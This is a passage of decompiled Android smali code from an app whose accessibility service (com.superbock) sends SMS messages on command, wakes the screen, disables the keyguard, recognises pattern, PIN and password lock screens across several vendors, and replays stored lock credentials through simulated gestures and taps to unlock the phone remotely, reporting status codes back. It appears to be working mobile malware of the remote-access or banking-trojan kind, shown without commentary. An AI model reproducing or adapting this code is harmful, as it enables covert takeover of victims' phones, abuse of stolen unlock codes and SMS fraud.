    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v1}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result v1

    const-wide/16 v2, 0x0

    const-string v6, "lockTime"

    if-eqz v1, :cond_3

    invoke-static {}, Lcom/blankj/utilcode/util/SPUtils;->getInstance()Lcom/blankj/utilcode/util/SPUtils;

    move-result-object v1

    invoke-virtual {v1, v6}, Lcom/blankj/utilcode/util/SPUtils;->getLong(Ljava/lang/String;)J

    move-result-wide v7

    cmp-long v1, v7, v2

    if-lez v1, :cond_2

    move-wide v2, v7

    goto :goto_3

    :cond_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    :goto_3
    const/4 v4, 0x1

    :cond_3
    invoke-static {}, Lcom/blankj/utilcode/util/SPUtils;->getInstance()Lcom/blankj/utilcode/util/SPUtils;

    move-result-object v1

    const-string v5, "lock"

    invoke-virtual {v1, v5, v4}, Lcom/blankj/utilcode/util/SPUtils;->put(Ljava/lang/String;I)V

    invoke-static {}, Lcom/blankj/utilcode/util/SPUtils;->getInstance()Lcom/blankj/utilcode/util/SPUtils;

    move-result-object v1

    invoke-virtual {v1, v6, v2, v3}, Lcom/blankj/utilcode/util/SPUtils;->put(Ljava/lang/String;J)V

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v0, v5, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    invoke-virtual {v0, v6, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v0}, Lf/a;->l()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ls3/g0;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final m0(I)V
    .locals 4
    .annotation build Landroidx/annotation/RequiresApi;
        api = 0x18
    .end annotation

    const/4 v0, 0x1

    if-eq p1, v0, :cond_3

    const/4 v0, 0x2

    if-eq p1, v0, :cond_2

    const/4 v0, 0x3

    if-eq p1, v0, :cond_1

    const/4 v0, 0x4

    if-eq p1, v0, :cond_0

    goto :goto_1

    :cond_0
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object p1

    iget v0, p0, Lf3/i$a;->o:F

    iget v1, p0, Lf3/i$a;->p:F

    iget v2, p0, Lf3/i$a;->m:F

    iget v3, p0, Lf3/i$a;->n:F

    goto :goto_0

    :cond_1
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object p1

    iget v0, p0, Lf3/i$a;->m:F

    iget v1, p0, Lf3/i$a;->n:F

    iget v2, p0, Lf3/i$a;->o:F

    iget v3, p0, Lf3/i$a;->p:F

    goto :goto_0

    :cond_2
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object p1

    iget v0, p0, Lf3/i$a;->k:F

    iget v1, p0, Lf3/i$a;->l:F

    iget v2, p0, Lf3/i$a;->i:F

    iget v3, p0, Lf3/i$a;->j:F

    goto :goto_0

    :cond_3
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object p1

    iget v0, p0, Lf3/i$a;->i:F

    iget v1, p0, Lf3/i$a;->j:F

    iget v2, p0, Lf3/i$a;->k:F

    iget v3, p0, Lf3/i$a;->l:F

    :goto_0
    invoke-virtual {p1, v0, v1, v2, v3}, Lcom/superbock/auto/BaseService;->q(FFFF)V

    :goto_1
    return-void
.end method

.method public final n0(ILjava/lang/String;Ljava/lang/String;)V
    .locals 9

    const-string v0, "38"

    const/4 v1, 0x0

    const/4 v2, 0x1

    if-eqz p1, :cond_2

    if-eq p1, v2, :cond_0

    goto/16 :goto_2

    :cond_0
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v3, "android.permission.SEND_SMS"

    invoke-static {p1, v3}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_1

    :goto_0
    invoke-static {v2, v0, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2

    :cond_1
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v3

    const/4 v5, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    move-object v4, p2

    move-object v6, p3

    invoke-virtual/range {v3 .. v8}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_2

    :cond_2
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string p2, "android.permission.READ_SMS"

    invoke-static {p1, p2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_3

    goto :goto_0

    :cond_3
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1, v2}, Lk3/f;->m(Landroid/content/Context;Z)V

    invoke-static {}, Lg3/d;->a()Lg3/d;

    move-result-object p1

    invoke-static {p1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-wide/16 p2, 0x0

    const/4 v0, 0x0

    :try_start_0
    iget-object p1, p1, Lg3/d;->b:Ljava/lang/Object;

    move-object v3, p1

    check-cast v3, Lt2/g;

    check-cast p1, Lt2/g;

    invoke-interface {p1}, Lt2/g;->c()Lz2/h;

    move-result-object p1

    iput-boolean v2, p1, Lz2/h;->l:Z

    invoke-virtual {p1}, Lz2/k;->g()Lz2/m;

    move-result-object p1

    const-string v2, "up"

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {p1, v2, v4}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-virtual {p1}, Lz2/m;->j()Lz2/f;

    move-result-object p1

    invoke-interface {v3, p1}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v2
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-wide v2, p2

    :goto_1
    cmp-long p1, v2, p2

    if-lez p1, :cond_4

    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/f;->t(Landroid/content/Context;)V

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string p2, ""

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "16"

    invoke-static {v0, p2, p1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    :cond_4
    if-nez p1, :cond_5

    const-string p1, "22"

    invoke-static {v0, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :cond_5
    :goto_2
    return-void
.end method

.method public final o0(Ls3/g0;)V
    .locals 3
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    new-instance v0, Lf/e;

    invoke-direct {v0}, Lf/e;-><init>()V

    const/16 v1, 0x457

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "code"

    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    const-string v2, "t"

    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v0}, Lf/a;->l()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ls3/g0;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final p0()V
    .locals 2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sput-wide v0, Lcom/superbock/auto/BaseService;->D:J

    return-void
.end method

.method public final q0()V
    .locals 26
    .annotation build Landroidx/annotation/RequiresApi;
        api = 0x1a
    .end annotation

    move-object/from16 v0, p0

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "keyguard"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/KeyguardManager;

    invoke-virtual {v1}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z

    move-result v2

    const/4 v3, 0x0

    const/4 v4, 0x1

    if-nez v2, :cond_0

    const-string v1, "24"

    invoke-static {v4, v1, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_0
    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v5, "power"

    invoke-virtual {v2, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/os/PowerManager;

    invoke-virtual {v2}, Landroid/os/PowerManager;->isScreenOn()Z

    move-result v5

    if-nez v5, :cond_2

    iget-object v5, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v5}, Landroidx/core/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroidx/core/app/NotificationManagerCompat;

    move-result-object v5

    invoke-virtual {v5}, Landroidx/core/app/NotificationManagerCompat;->areNotificationsEnabled()Z

    move-result v5

    if-nez v5, :cond_1

    const-string v5, "46"

    invoke-static {v4, v5, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    sget-boolean v5, Lcom/superbock/auto/BaseService;->z:Z

    if-nez v5, :cond_1

    const-string v1, "50"

    invoke-static {v4, v1, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_1
    const v5, 0x1000000a

    const-string v6, "bright"

    invoke-virtual {v2, v5, v6}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v2

    const-wide/16 v5, 0x2710

    invoke-virtual {v2, v5, v6}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    invoke-virtual {v2}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_2
    const-string v2, "unLock"

    invoke-virtual {v1, v2}, Landroid/app/KeyguardManager;->newKeyguardLock(Ljava/lang/String;)Landroid/app/KeyguardManager$KeyguardLock;

    move-result-object v2

    invoke-virtual {v2}, Landroid/app/KeyguardManager$KeyguardLock;->reenableKeyguard()V

    invoke-virtual {v2}, Landroid/app/KeyguardManager$KeyguardLock;->disableKeyguard()V

    const-wide/16 v5, 0x3e8

    :try_start_0
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    nop

    :goto_0
    invoke-virtual {v1}, Landroid/app/KeyguardManager;->isKeyguardSecure()Z

    move-result v1

    const/4 v2, 0x3

    if-nez v1, :cond_3

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void

    :cond_3
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :try_start_1
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    nop

    :goto_1
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1}, Lcom/superbock/auto/BaseService;->i()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const-string v7, "com.android.systemui:id/keyguard_host_view"

    invoke-static {v1, v7}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_4

    const-string v8, "com.android.systemui:id/keyguard_security_container"

    invoke-static {v1, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v9

    if-nez v9, :cond_4

    new-instance v11, Landroid/graphics/Path;

    invoke-direct {v11}, Landroid/graphics/Path;-><init>()V

    iget v1, v0, Lf3/i$a;->q:I

    int-to-float v1, v1

    const v9, 0x3e99999a    # 0.3f

    mul-float v1, v1, v9

    const v10, 0x3f333333    # 0.7f

    iget v12, v0, Lf3/i$a;->r:I

    int-to-float v12, v12

    mul-float v12, v12, v10

    invoke-virtual {v11, v1, v12}, Landroid/graphics/Path;->moveTo(FF)V

    iget v1, v0, Lf3/i$a;->q:I

    int-to-float v1, v1

    const v17, 0x3ecccccd    # 0.4f

    mul-float v1, v1, v17

    iget v10, v0, Lf3/i$a;->r:I

    int-to-float v10, v10

    const/high16 v18, 0x3f000000    # 0.5f

    mul-float v10, v10, v18

    invoke-virtual {v11, v1, v10}, Landroid/graphics/Path;->lineTo(FF)V

    new-instance v1, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v12, 0x0

    const-wide/16 v14, 0xc8

    const/16 v16, 0x1

    move-object v10, v1

    invoke-direct/range {v10 .. v16}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJZ)V

    new-instance v10, Landroid/graphics/Path;

    invoke-direct {v10}, Landroid/graphics/Path;-><init>()V

    iget v11, v0, Lf3/i$a;->q:I

    int-to-float v11, v11

    mul-float v11, v11, v17

    iget v12, v0, Lf3/i$a;->r:I

    int-to-float v12, v12

    mul-float v12, v12, v18

    invoke-virtual {v10, v11, v12}, Landroid/graphics/Path;->moveTo(FF)V

    const v11, 0x3f19999a    # 0.6f

    iget v12, v0, Lf3/i$a;->q:I

    int-to-float v12, v12

    mul-float v12, v12, v11

    iget v11, v0, Lf3/i$a;->r:I

    int-to-float v11, v11

    mul-float v11, v11, v9

    invoke-virtual {v10, v12, v11}, Landroid/graphics/Path;->lineTo(FF)V

    const-wide/16 v21, 0x0

    const-wide/16 v23, 0xa

    const/16 v25, 0x0

    move-object/from16 v19, v1

    move-object/from16 v20, v10

    invoke-virtual/range {v19 .. v25}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;->continueStroke(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v9

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v10

    new-instance v11, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v11}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {v11, v1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v1

    new-instance v11, Lf3/i$a$a;

    invoke-direct {v11, v9}, Lf3/i$a$a;-><init>(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)V

    invoke-virtual {v10, v1, v11, v3}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    :try_start_2
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catch_2
    nop

    :goto_2
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1}, Lcom/superbock/auto/BaseService;->i()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-static {v1, v7}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_4

    invoke-static {v1, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_4

    const-string v1, "25"

    invoke-static {v4, v1, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_4
    const-string v5, "com.android.systemui:id/lockPatternView"

    invoke-static {v1, v5}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v5

    const/4 v6, 0x0

    if-nez v5, :cond_14

    const-string v5, "com.android.systemui:id/lock_pattern_view"

    invoke-static {v1, v5}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_14

    const-string v5, "com.android.systemui:id/colorLockPatternView"

    invoke-static {v1, v5}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_14

    sget v5, Le3/d;->a:I

    const/4 v7, 0x4

    if-ne v5, v7, :cond_5

    const-string v8, "com.android.systemui:id/vivo_lock_pattern_view"

    invoke-static {v1, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_5

    goto/16 :goto_7

    :cond_5
    const-string v8, "com.android.systemui:id/pinEntry"

    invoke-static {v1, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v8

    const/4 v9, 0x2

    if-nez v8, :cond_12

    const-string v8, "com.android.systemui:id/fixedPinEntry"

    invoke-static {v1, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_6

    goto/16 :goto_5

    :cond_6
    const-string v8, "com.android.systemui:id/passwordEntry"

    invoke-static {v1, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v8

    const-string v10, "com.android.systemui:id/vivo_cancel"

    const-string v11, "33"

    const-string v12, "com.android.systemui:id/btn_letter_ok"

    const-string v13, "31"

    if-nez v8, :cond_e

    const-string v8, "com.android.systemui:id/securityEditText"

    invoke-static {v1, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_e

    if-ne v5, v7, :cond_7

    const-string v8, "com.android.systemui:id/MixPwEntry"

    invoke-static {v1, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_7

    goto :goto_3

    :cond_7
    invoke-static {}, Lg3/k;->b()Lg3/k;

    move-result-object v8

    invoke-virtual {v8, v6}, Lg3/k;->c(I)Lcom/superbock/bean/JInfo;

    move-result-object v8

    if-nez v8, :cond_8

    const-string v1, "29"

    invoke-static {v4, v1, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_8
    invoke-virtual {v8}, Lcom/superbock/bean/JInfo;->getTy()I

    move-result v14

    if-eq v14, v4, :cond_d

    if-eq v14, v9, :cond_c

    if-eq v14, v2, :cond_9

    goto/16 :goto_a

    :cond_9
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sput-wide v2, Lf3/i;->e:J

    invoke-virtual {v8}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lf3/i$a;->f0(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_a

    invoke-virtual {v8}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v1

    invoke-static {v4, v11, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_a
    invoke-virtual {v8}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v2

    invoke-static {v6, v13, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    invoke-static {v1, v12}, Li/g;->k(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_b

    if-ne v5, v7, :cond_b

    invoke-static {v1, v10}, Li/g;->k(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    :cond_b
    if-eqz v2, :cond_16

    goto :goto_4

    :cond_c
    invoke-virtual {v8}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v8}, Lcom/superbock/bean/JInfo;->getPw2()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v9, v1, v2, v4}, Lf3/i$a;->Z(ILjava/lang/String;Ljava/lang/String;Z)V

    invoke-virtual {v8}, Lcom/superbock/bean/JInfo;->getPw2()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_6

    :cond_d
    invoke-virtual {v8}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v4, v1, v3, v4}, Lf3/i$a;->Z(ILjava/lang/String;Ljava/lang/String;Z)V

    invoke-virtual {v8}, Lcom/superbock/bean/JInfo;->getPw2()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_8

    :cond_e
    :goto_3
    invoke-static {}, Lg3/k;->b()Lg3/k;

    move-result-object v8

    invoke-virtual {v8, v2}, Lg3/k;->c(I)Lcom/superbock/bean/JInfo;

    move-result-object v2

    if-nez v2, :cond_f

    const-string v1, "27"

    invoke-static {v4, v1, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_f
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    sput-wide v8, Lf3/i;->e:J

    invoke-virtual {v2}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Lf3/i$a;->f0(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_10

    invoke-virtual {v2}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v1

    invoke-static {v4, v11, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_10
    invoke-virtual {v2}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v2

    invoke-static {v6, v13, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    invoke-static {v1, v12}, Li/g;->k(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_11

    if-ne v5, v7, :cond_11

    invoke-static {v1, v10}, Li/g;->k(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    move-object v2, v1

    :cond_11
    if-eqz v2, :cond_16

    :goto_4
    const-wide/16 v3, 0x12c

    :try_start_3
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1, v2}, Lcom/superbock/auto/BaseService;->n(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_a

    :cond_12
    :goto_5
    invoke-static {}, Lg3/k;->b()Lg3/k;

    move-result-object v1

    invoke-virtual {v1, v9}, Lg3/k;->c(I)Lcom/superbock/bean/JInfo;

    move-result-object v1

    if-nez v1, :cond_13

    const-string v1, "26"

    invoke-static {v4, v1, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_13
    invoke-virtual {v1}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1}, Lcom/superbock/bean/JInfo;->getPw2()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v9, v2, v3, v4}, Lf3/i$a;->Z(ILjava/lang/String;Ljava/lang/String;Z)V

    invoke-virtual {v1}, Lcom/superbock/bean/JInfo;->getPw2()Ljava/lang/String;

    move-result-object v1

    :goto_6
    const-string v2, "30"

    goto :goto_9

    :cond_14
    :goto_7
    invoke-static {}, Lg3/k;->b()Lg3/k;

    move-result-object v1

    invoke-virtual {v1, v4}, Lg3/k;->c(I)Lcom/superbock/bean/JInfo;

    move-result-object v1

    if-nez v1, :cond_15

    const-string v1, "28"

    invoke-static {v4, v1, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_15
    invoke-virtual {v1}, Lcom/superbock/bean/JInfo;->getPw()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v4, v2, v3, v4}, Lf3/i$a;->Z(ILjava/lang/String;Ljava/lang/String;Z)V

    invoke-virtual {v1}, Lcom/superbock/bean/JInfo;->getPw2()Ljava/lang/String;

    move-result-object v1

    :goto_8
    const-string v2, "32"

    :goto_9
    invoke-static {v6, v2, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :cond_16
    :goto_a
    return-void
.end method

.method public final r0()V
    .locals 5

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v1, "keyguard"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z

    move-result v1

    const/4 v2, 0x1

    const/4 v3, 0x0

    if-nez v1, :cond_0

    const-string v0, "24"

    invoke-static {v2, v0, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_0
    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v4, "power"

    invoke-virtual {v1, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/PowerManager;

    invoke-virtual {v1}, Landroid/os/PowerManager;->isScreenOn()Z

    move-result v4

    if-nez v4, :cond_2

    iget-object v4, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v4}, Landroidx/core/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroidx/core/app/NotificationManagerCompat;

    move-result-object v4

    invoke-virtual {v4}, Landroidx/core/app/NotificationManagerCompat;->areNotificationsEnabled()Z

    move-result v4

    if-nez v4, :cond_1

    const-string v0, "46"

    invoke-static {v2, v0, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    const-string v0, "50"

    invoke-static {v2, v0, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_1
    const v2, 0x1000000a

    const-string v3, "bright"

    invoke-virtual {v1, v2, v3}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v1

    const-wide/16 v2, 0x2710

    invoke-virtual {v1, v2, v3}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->release()V

    goto :goto_0

    :cond_2
    const/4 v1, 0x0

    const-string v2, "51"

    invoke-static {v1, v2, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :goto_0
    const-string v1, "unLock"

    invoke-virtual {v0, v1}, Landroid/app/KeyguardManager;->newKeyguardLock(Ljava/lang/String;)Landroid/app/KeyguardManager$KeyguardLock;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/KeyguardManager$KeyguardLock;->reenableKeyguard()V

    invoke-virtual {v0}, Landroid/app/KeyguardManager$KeyguardLock;->disableKeyguard()V

    return-void
.end method
